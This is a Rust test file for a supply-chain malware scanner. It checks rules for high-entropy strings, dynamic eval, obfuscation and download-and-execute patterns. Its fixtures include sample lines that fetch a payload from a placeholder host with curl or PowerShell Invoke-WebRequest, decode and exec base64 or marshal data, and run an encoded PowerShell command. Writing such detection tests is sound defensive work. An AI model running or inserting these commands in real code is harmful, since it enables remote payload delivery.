use std::fs;

use super::*;
use crate::rules::default_rules as built_in_rules;

#[test]
fn all_built_in_tree_sitter_queries_compile() {
    validate_rules(&built_in_rules()).unwrap();
}

#[test]
fn structured_literal_detection_is_composable_and_case_insensitive() {
    let structured = [
        "https://example.com/resource",
        "Fetch from https://example.com/resource with the supplied token",
        "select token from sessions where active = true",
        r"r'^(?:[a-z]+)$'",
        "User {user_id:08x} requested {resource}",
        "This is ordinary documentation.",
    ];
    let opaque = [
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
        "a string with no structural markers",
    ];

    for value in structured {
        assert!(
            super::is_structured_literal(value),
            "expected structured: {value}"
        );
    }
    for value in opaque {
        assert!(
            !super::is_structured_literal(value),
            "expected opaque: {value}"
        );
    }
}

#[test]
fn scanner_reports_only_high_entropy_string_literals() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("entropy.py"),
        concat!(
            "ordinary = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'\n",
            "alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'\n",
            "borderline = 'aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqrstuvwxyzABCDEF'\n",
            "opaque = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n",
            "url = 'https://example.com/api/v1/items?query=abcdefghijklmnopqrstuvwxyz0123456789'\n",
            "embedded_url = 'callback=https://example.com/api/v1/items?token=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n",
            "regex = r'^(?:[A-Za-z0-9._%+-]+)@(?:[A-Za-z0-9.-]+)\\\\.[A-Za-z]{2,}$'\n",
            "sql = 'SELECT account_id, display_name, email_address FROM users WHERE status = \'active\''\n",
            "format_string = 'User {user_id:08x} requested {resource_name} at {timestamp:%Y-%m-%d}'\n",
            "documentation = 'This documentation sentence describes ordinary usage and should not be treated as opaque.'\n",
        ),
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let entropy_findings = outcome
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "chainsec.py.detection.heuristic.high-entropy-string")
        .collect::<Vec<_>>();

    assert_eq!(entropy_findings.len(), 1);
    assert!(
        entropy_findings[0]
            .matched_code
            .contains("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    );
}

#[test]
fn scanner_exempts_binary_and_compressed_test_fixtures_only() {
    let directory = tempfile::tempdir().unwrap();
    fs::create_dir_all(directory.path().join("tests/fixtures")).unwrap();
    fs::create_dir_all(directory.path().join("tests/io/data")).unwrap();
    fs::create_dir_all(directory.path().join("src/data")).unwrap();
    fs::write(
        directory.path().join("tests/fixtures/fixture.bin"),
        [0, 1, 2, 3],
    )
    .unwrap();
    fs::write(
        directory.path().join("tests/fixtures/fixture.gz"),
        [0x1f, 0x8b, 0, 1],
    )
    .unwrap();
    fs::write(
        directory.path().join("tests/io/data/sample.bin"),
        [0, 1, 2, 3],
    )
    .unwrap();
    fs::write(directory.path().join("tests/sample.bin"), [0, 1, 2, 3]).unwrap();
    fs::write(directory.path().join("src/data/sample.bin"), [0, 1, 2, 3]).unwrap();
    fs::write(directory.path().join("payload.bin"), [0, 1, 2, 3]).unwrap();
    fs::write(directory.path().join("payload.gz"), [0x1f, 0x8b, 0, 1]).unwrap();

    let outcome = scan(directory.path(), "root", &[], &EngineLimits::default()).unwrap();
    let findings = outcome
        .findings
        .iter()
        .map(|finding| (finding.rule_id.as_str(), finding.file.as_path()))
        .collect::<Vec<_>>();

    assert!(findings.contains(&("chainsec.detection.file.binary", Path::new("payload.bin"))));
    assert!(findings.contains(&(
        "chainsec.detection.file.compressed",
        Path::new("payload.gz")
    )));
    assert!(findings.contains(&(
        "chainsec.detection.file.binary",
        Path::new("tests/sample.bin")
    )));
    assert!(findings.contains(&(
        "chainsec.detection.file.binary",
        Path::new("src/data/sample.bin")
    )));
    assert!(!findings.iter().any(|(_, path)| {
        *path == Path::new("tests/io/data/sample.bin") || path.starts_with("tests/fixtures")
    }));
}

#[test]
fn download_execution_rule_requires_a_powershell_payload() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("commands.py"),
        concat!(
            "import subprocess\n",
            "subprocess.run(['powershell.exe', '-command', 'Get-Clipboard'])\n",
            "subprocess.run(['powershell.exe', '-command', 'Invoke-WebRequest https://example.invalid/payload'])\n",
        ),
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let findings = outcome
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "chainsec.py.detection.guarddog.download-and-execute")
        .collect::<Vec<_>>();

    assert_eq!(findings.len(), 1);
    assert!(findings[0].matched_code.contains("Invoke-WebRequest"));
}

#[test]
fn js010_only_reports_assignments_to_window() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("window.js"),
        concat!(
            "window.location = url;\n",
            "window['name'] = value;\n",
            "result.length = len;\n",
            "exports.value = value;\n",
            "globalThis.value = value;\n",
        ),
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let findings = outcome
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "chainsec.js.detection.write-browser-global")
        .collect::<Vec<_>>();

    assert_eq!(findings.len(), 2);
    assert!(
        findings
            .iter()
            .any(|finding| finding.matched_code.contains("window.location"))
    );
    assert!(
        findings
            .iter()
            .any(|finding| finding.matched_code.contains("window['name']"))
    );
}

#[test]
fn semantic_rules_detect_dynamic_execution_and_obfuscator_structures() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("payload.js"),
        concat!(
            "globalThis['eval'](payload);\n",
            "setTimeout('runPayload()', 10);\n",
            "const table = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'];\n",
            "function decode(index) { return table[index]; }\n",
            "while (cursor < order.length) { switch (order[cursor++]) { case '0': run(); break; } }\n",
        ),
    ).unwrap();
    fs::write(
        directory.path().join("payload.py"),
        concat!(
            "import marshal\n",
            "exec(marshal.loads(blob))\n",
            "import importlib\n",
            "module = importlib.import_module(name)\n",
            "from pyarmor_runtime import __pyarmor__\n",
        ),
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let rule_ids = outcome
        .findings
        .iter()
        .map(|finding| finding.rule_id.as_str())
        .collect::<HashSet<_>>();
    for rule_id in [
        "chainsec.js.detection.heuristic.dynamic-code-execution",
        "chainsec.js.detection.heuristic.string-table",
        "chainsec.js.detection.heuristic.control-flow-flattening",
        "chainsec.py.detection.heuristic.opaque-execution-input",
        "chainsec.py.detection.heuristic.dynamic-module",
        "chainsec.py.detection.heuristic.code-protector-marker",
    ] {
        assert!(rule_ids.contains(rule_id), "missing {rule_id}");
    }
}

#[test]
fn semantic_rules_do_not_flag_local_eval_or_static_imports() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("safe.js"),
        concat!(
            "function eval(value) { return value; }\n",
            "const result = eval(input);\n",
            "setTimeout(callback, 10);\n",
        ),
    )
    .unwrap();
    fs::write(
        directory.path().join("safe.py"),
        "import json\nvalue = json.loads(data)\n",
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    assert!(!outcome.findings.iter().any(|finding| {
        matches!(
            finding.rule_id.as_str(),
            "chainsec.js.detection.heuristic.dynamic-code-execution"
                | "chainsec.py.detection.heuristic.dynamic-module"
                | "chainsec.py.detection.heuristic.opaque-execution-input"
        )
    }));
}

#[test]
fn semantic_dynamic_execution_uses_syntax_not_line_heuristics() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("contexts.ts"),
        concat!(
            "// eval(payload)\n",
            "const example = 'eval(payload)';\n",
            "interface Evaluator { eval(payload: string): unknown; }\n",
            "type EvaluatorAlias = { eval(payload: string): unknown };\n",
            "const label = 'trusted'; eval(payload);\n",
        ),
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let findings = outcome
        .findings
        .iter()
        .filter(|finding| {
            finding.rule_id == "chainsec.ts.detection.heuristic.dynamic-code-execution"
        })
        .collect::<Vec<_>>();

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].location.start_line, 5);
}

#[test]
fn semantic_python_obfuscator_matches_only_known_markers() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("ordinary.py"),
        "eval(payload)\nfrom pyarmor_runtime import __pyarmor__\n",
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let matches = outcome
        .findings
        .iter()
        .filter(|finding| {
            finding.rule_id == "chainsec.py.detection.heuristic.code-protector-marker"
        })
        .collect::<Vec<_>>();

    assert_eq!(matches.len(), 2);
    assert!(matches.iter().all(|finding| {
        matches!(
            finding.matched_code.as_str(),
            "pyarmor_runtime" | "__pyarmor__"
        )
    }));
}

#[test]
fn semantic_dynamic_execution_does_not_guess_alias_bindings() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("aliases.js"),
        concat!(
            "const run = eval;\n",
            "api.run(payload);\n",
            "function safe(run) { run(payload); }\n",
            "let reassigned = eval;\n",
            "reassigned = harmless;\n",
            "reassigned(payload);\n",
        ),
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    assert!(
        !outcome
            .findings
            .iter()
            .any(|finding| finding.rule_id
                == "chainsec.js.detection.heuristic.dynamic-code-execution")
    );
}

#[test]
fn semantic_dynamic_execution_respects_lexical_shadowing_and_exact_ranges() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("scopes.js"),
        concat!(
            "function wrapper(eval) { return eval(payload); }\n",
            "const Function = safe; Function(payload);\n",
            "const value = 1; eval(payload);\n",
        ),
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let findings = outcome
        .findings
        .iter()
        .filter(|finding| {
            finding.rule_id == "chainsec.js.detection.heuristic.dynamic-code-execution"
        })
        .collect::<Vec<_>>();

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].location.start_line, 3);
    assert_eq!(findings[0].matched_code, "eval(payload)");
}

#[test]
fn semantic_matching_rejects_invalid_utf8_without_panicking() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("invalid.js"),
        b"const data = '\xff'; eval(payload);\n",
    )
    .unwrap();

    let error = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap_err();
    assert!(error.to_string().contains("requires valid UTF-8"));
}

#[test]
fn scanner_ignores_character_formatting_as_obfuscation() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("format.js"),
        concat!(
            "const formatted = String.fromCharCode(parseInt(arg, 10))\n",
            "const decoded = String.fromCharCode(72, 101, 108, 108, 111)\n",
        ),
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let findings = outcome
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "chainsec.js.detection.decoded-payload")
        .collect::<Vec<_>>();

    assert_eq!(findings.len(), 1);
    assert!(findings[0].matched_code.contains("72, 101"));
}

#[test]
fn scanner_reports_tree_sitter_guarddog_equivalents() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("payload.py"),
        concat!(
            "import base64\n",
            "import subprocess\n",
            "subprocess.run(['curl', 'https://example.invalid/payload'])\n",
            "exec(base64.b64decode(payload))\n",
        ),
    )
    .unwrap();
    fs::write(
        directory.path().join("payload.js"),
        "child_process.exec('powershell -EncodedCommand QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB')\n",
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let rule_ids = outcome
        .findings
        .iter()
        .map(|finding| finding.rule_id.as_str())
        .collect::<HashSet<_>>();

    assert!(rule_ids.contains("chainsec.py.capability.network-connect-via-lolbas"));
    assert!(rule_ids.contains("chainsec.py.detection.guarddog.base64-decoded-execution"));
    assert!(rule_ids.contains("chainsec.js.detection.guarddog.encoded-powershell"));
}

#[test]
fn scanner_bounds_non_source_reads_but_preserves_file_analysis() {
    let directory = tempfile::tempdir().unwrap();
    let mut bytes = vec![0; (super::MAX_NON_SOURCE_ANALYSIS_BYTES as usize) + 1];
    bytes[0] = 0;
    fs::write(directory.path().join("large.bin"), &bytes).unwrap();

    let outcome = scan(directory.path(), "root", &[], &EngineLimits::default()).unwrap();

    let finding = outcome
        .findings
        .iter()
        .find(|finding| finding.rule_id == "chainsec.detection.file.binary")
        .unwrap();
    assert!(finding.matched_code.contains("size: 1048577 bytes"));
    assert_eq!(outcome.scanned_files, 0);
}

#[test]
fn scanner_reports_stable_relative_locations() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(directory.path().join("bad.py"), "eval(payload)\n").unwrap();
    let first = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let second = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    assert_eq!(first.findings[0].id, second.findings[0].id);
    assert_eq!(first.findings[0].file, PathBuf::from("bad.py"));
}
